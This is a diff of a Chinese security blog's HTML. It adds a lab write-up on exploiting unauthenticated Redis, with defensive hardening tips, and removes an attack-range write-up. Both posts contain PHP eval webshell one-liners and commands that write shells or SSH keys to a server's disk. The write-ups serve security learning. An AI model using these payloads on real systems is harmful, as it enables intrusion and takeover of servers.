+<h1 id="0x04-复盘"><a href="#0x04-复盘" class="headerlink" title="0x04 复盘"></a>0x04 复盘</h1><ul>
+<li><p>此处apache中间件无用武之地</p>
+</li>
+<li><p>用户名小写我是没想到</p>
+</li>
+</ul>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
+<li>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/goldeneye-1,240/">https://www.vulnhub.com/entry/goldeneye-1,240/</a></li>
+<li>文章参考：<a target="_blank" rel="noopener" href="https://programmersought.com/article/93378040168/#_252">https://programmersought.com/article/93378040168/#_252</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.shawroot.cc/1842.html">https://www.shawroot.cc/1842.html</a></li>
+<li>nc实现telnet连接pop3：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LL458524906/article/details/74635272">https://blog.csdn.net/LL458524906/article/details/74635272</a></li>
+<li>aspell参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1764068">https://cloud.tencent.com/developer/article/1764068</a></li>
+<li>tty-teletypewriter：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000038466327">https://segmentfault.com/a/1190000038466327</a></li>
+</ol>
 
       
     </div>
@@ -643,6 +734,185 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's Blue SKY">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">redis未授权总结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-04 22:32:04" itemprop="dateCreated datePublished" datetime="2021-06-04T22:32:04+08:00">2021-06-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-07-05 13:51:58" itemprop="dateModified" datetime="2021-07-05T13:51:58+08:00">2021-07-05</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>2.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前总结过的内容被自己的windows defender杀掉了，现哭着再总结一次。起因源于之前参加hvv遇到此洞，故而作此总结。</p>
+<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>用ANSI  C写的redis作为非关系型内存数据库，是key-value存储系统，且支持主从服务器同步。redis漏洞产生的原因一般是：</p>
+<ul>
+<li><strong>直接暴露在公网</strong>：绑定在 <code>0.0.0.0:6379</code>，且没有进行添加防火墙规则、避免其他非信任来源IP访问等相关安全策略</li>
+<li><strong>没有设置密码认证</strong>(一般为空)：可以免密远程登录redis服务</li>
+</ul>
+<p>漏洞可能产生的危害:</p>
+<p>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以通过恶意执行flushall来清空所有数据<br>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件<br>如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害者服务器</p>
+<p>下图为redis拿shell的三种方式及其条件：</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.jpg"></p>
+<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>靶机：Ubuntu 192.168.140.129</p>
+<p>攻击机：kali 192.168.140.130</p>
+<p>kali一键安装redis，sudo apt install redis</p>
+<p>Ubuntu debian或其他环境安装指南：</p>
+<p>安装：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf redis-6.0.1.tar.gz</span><br><span class="line">mv redis-6.0.1 /usr/local/redis</span><br><span class="line">cd /usr/local/redis</span><br><span class="line">make &amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 任意目录启动</span></span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line">cp redis.conf /etc</span><br></pre></td></tr></table></figure>
+
+<p>配置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 去掉仅对内网开放，加#</span><br><span class="line"># bind 127.0.0.1</span><br><span class="line"># redis关闭守护进程</span><br><span class="line">daemonize no</span><br><span class="line"># 关闭保护模式</span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"># 重启配置文件</span><br><span class="line">redis-server redis.conf</span><br><span class="line"># 关闭防火墙</span><br><span class="line">ufw disable</span><br></pre></td></tr></table></figure>
+
+<p>当然，别忘了，ubuntu要启动redis-server服务。</p>
+<p>为保证后面写入计划任务，此处以root权限启动redis</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/10.png"></p>
+<h1 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h1><h2 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1. 写webshell"></a>1. 写webshell</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>存在web目录</p>
+<p>晓得绝对路径</p>
+<p>当然还要有写入权限</p>
+<h3 id="流程："><a href="#流程：" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>实际渗透过程中，这个方法通常需要搭配 phpinfo 等信息使用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  192.168.140.129 or 域名</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置写入文件</span></span><br><span class="line">config set dbfilename 1.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> 以键值对的形式写入一句话木马</span></span><br><span class="line">set webshell &quot;&lt;?php @eval($_POST[&#x27;swanq&#x27;]);?&gt;&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存写入硬盘</span></span><br><span class="line">save </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/1.png"></p>
+<p>最后用蚁剑连接即可：<code>http://192.168.127.139/1.php</code></p>
+<h2 id="2-写ssh公钥"><a href="#2-写ssh公钥" class="headerlink" title="2. 写ssh公钥"></a>2. 写ssh公钥</h2><p>原理：Redis 未授权访问通过写 <code>/root/.ssh</code>下的authorized_keys 来拿权限</p>
+<h3 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>对外开启ssh服务</p>
+<p>Redis 服务运行在 root 用户下（否则还要猜测用户）</p>
+<h3 id="流程：-1"><a href="#流程：-1" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>生成本机ssh公私钥</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.png"></p>
+<p>为防止脏数据污染公钥，在公钥内容上下加空行。之后将公钥写入key.txt</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/3.png"></p>
+<blockquote>
+<p>shell的echo :</p>
+<p>用于字符串输出，其注意事项如下图所示：</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/7.png"></p>
+</blockquote>
+<p>redis远程连接靶机，将公钥文件key.txt写入靶机</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/4.png"></p>
+<blockquote>
+<p>-x：read last argument from STDIN</p>
+<p>cat key.txt | redis -h 192.168.140.129 -x set crack：</p>
+<ul>
+<li><p>cat key.txt 输出 作为后面的输入</p>
+</li>
+<li><p>-x 读取标准输入</p>
+</li>
+<li><p>set crack 是将读取的输入作为crack此参数内容</p>
+<p>相当于把参数crack参数和-x读的数据组了个命令执行</p>
+</li>
+</ul>
+</blockquote>
+<p>找到靶机redis备份路径：</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/8.png"></p>
+<p>更改redis备份路径为ssh公钥存放目录/home/glory/.ssh,默认情况为/root/.ssh。并设置上传公钥文件名为authorized_keys</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/5.png"></p>
+<blockquote>
+<p>config:可查看或设置配置项</p>
+<p>dbfilename:备份文件</p>
+</blockquote>
+<p>SSH远程登陆成功</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/6.png"></p>
+<h2 id="3-在crontab中写定时任务"><a href="#3-在crontab中写定时任务" class="headerlink" title="3. 在crontab中写定时任务"></a>3. 在crontab中写定时任务</h2><h3 id="条件：-2"><a href="#条件：-2" class="headerlink" title="条件："></a>条件：</h3><p>有可写计划任务的权限,将文件写入到计划目录下执行</p>
+<p>多见于CentOs使用</p>
+<h3 id="流程：-2"><a href="#流程：-2" class="headerlink" title="流程："></a>流程：</h3><p>攻击机监听本机9999端口，接收之后的反弹shell</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/9.png"></p>
+<p>利用redis以root权限运行有可写计划任务的权限，写crontab</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/11.png"></p>
+<blockquote>
+<p>1./var/spool/cron目录存储每个用户生成的crontab文件</p>
+<p>2.直接往当前用户的crontab中写反弹shell，必须要换行</p>
+<p>3.* * * * * myCommand：1分钟执行一次myCommand</p>
+<p>4.n个数大于2，否则文件内容里面的任务计划会出现乱码导致命令执行失败</p>
+</blockquote>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/12.png"></p>
+<p>观察到此时并无反弹shell。但是确实写入成功。</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/13.png"></p>
+<p>具体排查问题另起一篇博客说明。</p>
+<h1 id="0x02-如何防护"><a href="#0x02-如何防护" class="headerlink" title="0x02 如何防护"></a>0x02 如何防护</h1><h4 id="1-禁止远程使用一些高危命令"><a href="#1-禁止远程使用一些高危命令" class="headerlink" title="1.禁止远程使用一些高危命令"></a>1.禁止远程使用一些高危命令</h4><p>我们可以通过修改redis.conf文件来禁用远程修改DB文件地址</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-低权限运行Redis服务"><a href="#2-低权限运行Redis服务" class="headerlink" title="2.低权限运行Redis服务"></a>2.低权限运行Redis服务</h4><p>为Redis服务创建单独的<code>user</code>和<code>home</code>目录，并且配置禁止登陆</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-为Redis添加密码验证"><a href="#3-为Redis添加密码验证" class="headerlink" title="3.为Redis添加密码验证"></a>3.为Redis添加密码验证</h4><p>我们可以通过修改redis.conf文件来为Redis添加密码验证</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-禁止外网访问-Redis"><a href="#4-禁止外网访问-Redis" class="headerlink" title="4.禁止外网访问 Redis"></a>4.禁止外网访问 Redis</h4><p>我们可以通过修改redis.conf文件来使得Redis服务只在当前主机可用</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
+<li>下载链接：<a target="_blank" rel="noopener" href="http://download.redis.io/releases/redis-6.0.1.tar.gz">http://download.redis.io/releases/redis-6.0.1.tar.gz</a></li>
+<li><a target="_blank" rel="noopener" href="https://hejueyun.github.io/posts/2218125b/">https://hejueyun.github.io/posts/2218125b/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></li>
+<li>redis相关：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
+<li>corntab命令参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/28/VulnHub-GoldenEye/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -657,7 +927,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/05/28/VulnHub-GoldenEye/" class="post-title-link" itemprop="url">VulnHub靶机系列：GoldenEye</a>
+            <a href="/2021/05/28/VulnHub-GoldenEye/" class="post-title-link" itemprop="url">VulnHub靶机系列：GoldenEye渗透Writeup</a>
         </h2>
 
         <div class="post-meta">
@@ -674,7 +944,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-02 20:47:40" itemprop="dateModified" datetime="2021-07-02T20:47:40+08:00">2021-07-02</time>
+                <time title="修改时间：2021-07-04 12:41:10" itemprop="dateModified" datetime="2021-07-04T12:41:10+08:00">2021-07-04</time>
               </span>
 
           
@@ -866,10 +1136,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-05-25 09:51:20 / 修改时间：14:34:27" itemprop="dateCreated datePublished" datetime="2021-05-25T09:51:20+08:00">2021-05-25</time>
+              <time title="创建时间：2021-05-25 09:51:20" itemprop="dateCreated datePublished" datetime="2021-05-25T09:51:20+08:00">2021-05-25</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-07-05 11:38:57" itemprop="dateModified" datetime="2021-07-05T11:38:57+08:00">2021-07-05</time>
+              </span>
 
           
             <span class="post-meta-item" title="本文字数">
@@ -911,20 +1187,20 @@
 <p><strong>Authentication Server</strong>： AS的作用就是验证Client端的身份（确定你是身份证上的本人），验证通过就会给一张<strong>TGT</strong>（Ticket Granting Ticket）票给Client。</p>
 <p><strong>Ticket Granting Server</strong>： TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（上车的票ST）。ST（ServiceTicket）也有资料称为TGS Ticket，为了和TGS区分，在这里就用ST来说明。</p>
 <p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/2.jpg"></p>
-<p>KDC服务框架中包含一个<strong>KRBTGT</strong>账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为他就是一个无法登陆的账号，在发送票据的时候会使用到他的密码hash。</p>
+<p>KDC服务框架中包含一个<strong>KRBTGT</strong>账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为他就是一个无法登陆的账号，在发送票据的时候会使用到其hash。</p>
 <p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/3.jpg"></p>
 <h2 id="2-Kerberos认证-ticket-system"><a href="#2-Kerberos认证-ticket-system" class="headerlink" title="2. Kerberos认证-ticket system"></a>2. Kerberos认证-ticket system</h2><p>流程当Client想要访问Server上的某个服务时，需要先向AS证明自己的身份，然后通过AS发放的TGT向Server发起认证请求，这个过程分为三块：</p>
 <p><strong>The Authentication Service Exchange</strong>：Client与AS的交互</p>
 <p><strong>The Ticket-Granting Service (TGS) Exchange</strong>：Client与TGS的交互</p>
 <p><strong>The Client/Server Authentication Exchange</strong>：Client与Server的交互</p>
 <p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/4.jpg"></p>
-<p><strong>(1)TheAuthentication Service Exchange</strong></p>
+<p><strong>(1)The Authentication Service Exchange</strong></p>
 <p>KRB_AS_REQ</p>
-<p>Client-&gt;AS：发送 Authenticator1(Client 密码加密 TimeStamp)</p>
-<p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1，内容为通过 Client 密码 Hash 加密的时间戳、ClientID、网络地址、加密类型等内容。</p>
+<p>Client-&gt;AS：发送 Authenticator1(Client 加密 TimeStamp)</p>
+<p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1，内容为通过 Client  Hash 加密的时间戳、ClientID、网络地址、加密类型等内容。</p>
 <p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/5.jpg"></p>
 <p>KRB_AS_REP</p>
-<p>AS-&gt; Client：发送 Client 密码加密的 sessionkey-as 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)</p>
+<p>AS-&gt; Client：发送 Client 加密的 sessionkey-as 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)</p>
 <p>在 KDC 中存储了域中所有用户的密码 HASH，当 AS 接收到 Client 的请求之后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 HASH 加密的 sessionkey-as 和 TGT（由 KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp 等信息）。</p>
 <p><strong>(2)TheTicket-Granting Service (TGS) Exchange</strong></p>
 <p>KRB_TGS_REQ</p>
@@ -1046,264 +1322,6 @@
 <h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><ol>
 <li><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/11419">https://www.secrss.com/articles/11419</a></li>
 </ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/14/PenetrationRange/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
-      <meta itemprop="name" content="swanQ">
-      <meta itemprop="description" content="Try & Enjoy">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SwanQ's Blue SKY">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/05/14/PenetrationRange/" class="post-title-link" itemprop="url">ATK&CK实战靶场搭建及攻击</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-05-14 20:00:13" itemprop="dateCreated datePublished" datetime="2021-05-14T20:00:13+08:00">2021-05-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-26 10:25:48" itemprop="dateModified" datetime="2021-05-26T10:25:48+08:00">2021-05-26</time>
-              </span>
-
-          
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>5 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h1><p>说实话对于搭建window内外网IP之前没试过，觉得也很简单，结果把内网网络适配器和外网的网络适配器搞反了，导致时间耗费较高，特此记录。其他的博客大抵都跳过了此步骤。</p>
-<p>下载靶场环境：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
-<p>大家的模拟攻击示意图很清楚，在此借鉴一下：</p>
-<p><img src="/2021/05/14/PenetrationRange/4.png"></p>
-<p>靶机环境拓扑图如下：<br><img src="/2021/05/14/PenetrationRange/2.png"></p>
-<p>配置网络：</p>
-<p>分别给web服务器配置NAT模式的网卡一个作为外网，VMnet2的网卡一个作为内网。其余域控和域成员分配一个VMnet2即可。在vmware的虚拟网络配置器里面需要添加VMnet2，且设置NAT模式取消DHCP自动分配IP选项。</p>
-<p>win7开机后，需要设置本地连接6的IPV4如下图所示：</p>
-<p>控制面板 - 网络和Internet - 网络和共享中心 - 更改适配器设置 - 右键本地连接6 - 双击IPv4，其中<strong>114.114.114.114</strong>是国内三大运营商的通用DNS，是国内用户上网常用的DNS</p>
-<p><strong>8.8.8.8</strong>和<strong>8.8</strong>.<strong>4.4</strong> 是Google提供的免费DNS服务器的IP，更适合国外以及访问国外网站的用户使用</p>
-<p><img src="/2021/05/14/PenetrationRange/3.png"></p>
-<p>参考下图:<br><img src="/2021/05/14/PenetrationRange/1.png"></p>
-<p>开启win7的phpstudy,同时测试win7是否可以pingkali和内网的两台主机。ping通over，环境搭建到此结束。</p>
-<h1 id="2-攻击流程"><a href="#2-攻击流程" class="headerlink" title="2. 攻击流程"></a>2. 攻击流程</h1><h2 id="0x01-主机发现"><a href="#0x01-主机发现" class="headerlink" title="0x01 主机发现"></a>0x01 主机发现</h2><p>DMZ区也就是处于两个防火墙之间的，一个合格的DMZ区是为了提供外部主机访问内网资源服务器的一个缓冲区域，应该有着严格的内外网隔离，本次靶场只是一个模拟，dmz区并没有很合规。</p>
-<p>那么入手以后，先进行信息收集，桥接嘛，那么直接扫一下桥接网段的存活主机</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.140.0/24</span><br><span class="line"></span><br><span class="line">netdiscover -i eth0 -r 192.168.140.0/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/14/PenetrationRange/5.png"></p>
-<p>获得目标IP，开始扫描端口：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> -vv提高输出信息的详细度</span></span><br><span class="line">nmap -sV -vv -p 1-65535 192.168.140.130</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/14/PenetrationRange/6.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/7.png"></p>
-<p>80端口是一个phpstudy探针：</p>
-<p><img src="/2021/05/14/PenetrationRange/8.png"></p>
-<p>最下方有数据库登陆框测试mysql连同，尝试root/root即可登陆。初步getshell思路就是通过mysql拿shell。</p>
-<p><img src="/2021/05/14/PenetrationRange/9.png"></p>
-<p>目录扫描还是御剑靠谱一点，扫出beifen.rar。</p>
-<p><img src="/2021/05/14/PenetrationRange/10.png"></p>
-<p>备份文件发现网站源码，打开robots.txt发现网站CMS为yxcms，访问<code>http://192.168.1.102/yxcms</code>进入网站首页</p>
-<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="漏洞一：信息泄露-弱口令"><a href="#漏洞一：信息泄露-弱口令" class="headerlink" title="漏洞一：信息泄露+弱口令"></a>漏洞一：信息泄露+弱口令</h3><p>网站<a target="_blank" rel="noopener" href="http://192.168.1.102/yxcms%E5%90%8E%E5%8F%B0%E6%B3%84%E9%9C%B2%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E5%9C%B0%E5%9D%80%E5%92%8C%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E3%80%82">http://192.168.1.102/yxcms后台泄露后台登陆地址和用户密码。</a></p>
-<p><img src="/2021/05/14/PenetrationRange/11.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/12.png"></p>
-<p>成功登陆后台管理页面，可以添加、编辑、删除管理员，管理数据库及上传文件。</p>
-<h3 id="漏洞二：PhpMyAdmin弱口令"><a href="#漏洞二：PhpMyAdmin弱口令" class="headerlink" title="漏洞二：PhpMyAdmin弱口令"></a>漏洞二：PhpMyAdmin弱口令</h3><p>使用默认用户名/口令（root/root）成功登录PhpMyAdmin管理页面，可以看到数据库的所有内容</p>
-<p><img src="/2021/05/14/PenetrationRange/13.jpg"></p>
-<h3 id="漏洞三：yxcms留言本XSS存储型漏洞"><a href="#漏洞三：yxcms留言本XSS存储型漏洞" class="headerlink" title="漏洞三：yxcms留言本XSS存储型漏洞"></a>漏洞三：yxcms留言本XSS存储型漏洞</h3><p>前台提交带有XSS代码的留言，后台审核成功弹出XSS弹窗，审核通过之后，前台成功弹窗。通过该漏洞可以获取管理员cookie或者诱导管理员点击执行某恶意代码</p>
-<p><img src="/2021/05/14/PenetrationRange/14.jpg"></p>
-<p><img src="/2021/05/14/PenetrationRange/13.png"></p>
-<h3 id="漏洞四：yxcms后台任意文件读写漏洞"><a href="#漏洞四：yxcms后台任意文件读写漏洞" class="headerlink" title="漏洞四：yxcms后台任意文件读写漏洞"></a>漏洞四：yxcms后台任意文件读写漏洞</h3><p>后台管理首页–&gt; 前台模板–&gt;管理模板文件 –&gt;新建hack.php文件</p>
-<p><img src="/2021/05/14/PenetrationRange/14.png"></p>
-<p>找备份文件即可看到文件的保存目录为：<a target="_blank" rel="noopener" href="http://192.168.1.102/yxcms/protected/apps/default/view/default/hack.php">http://192.168.1.102/yxcms/protected/apps/default/view/default/hack.php</a></p>
-<p><img src="/2021/05/14/PenetrationRange/15.jpg"></p>
-<p>使用蚁剑成功连接：</p>
-<p><img src="/2021/05/14/PenetrationRange/15.png"></p>
-<h3 id="漏洞五：PhpMyAdmin开启全局日志getshell"><a href="#漏洞五：PhpMyAdmin开启全局日志getshell" class="headerlink" title="漏洞五：PhpMyAdmin开启全局日志getshell"></a>漏洞五：PhpMyAdmin开启全局日志getshell</h3><ol>
-<li><p>测试是否可以使用into outfile写入文件到web目录：Select ‘<?php eval($_POST[hack]);?> ‘ into outfile ‘C:/phpStudy/WWW/hack.php’。发现写入失败。</p>
-</li>
-<li><p>再查看变量secure-file-priv 值： <code>show global variables like ‘%secure%’</code>发现为NULL，为只读无法修改。</p>
-</li>
-</ol>
-<p><img src="/2021/05/14/PenetrationRange/16.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/17.png"></p>
-<ol start="3">
-<li><p>尝试用全局日志写shell，查看全局变量general_log：<code>show global variables like ‘%general_%’</code>。于是开启全局日志并修改日志保存位置为C:/phpStudy/WWW/hack.php</p>
